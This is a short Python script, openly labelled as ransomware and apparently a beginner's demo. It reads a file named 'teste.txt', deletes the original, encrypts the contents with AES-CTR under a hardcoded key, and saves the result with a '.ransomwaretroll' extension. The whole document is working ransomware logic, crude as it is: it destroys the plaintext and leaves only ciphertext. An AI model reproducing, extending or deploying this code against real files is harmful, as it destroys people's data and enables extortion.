import os
import pyaes

# Open the file that will to be encrypter

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remove the original file
os.remove(file_name)

# cryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# cryption the file
crypto_data = aes.encrypt(file_data)

# save the file cryptioned

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

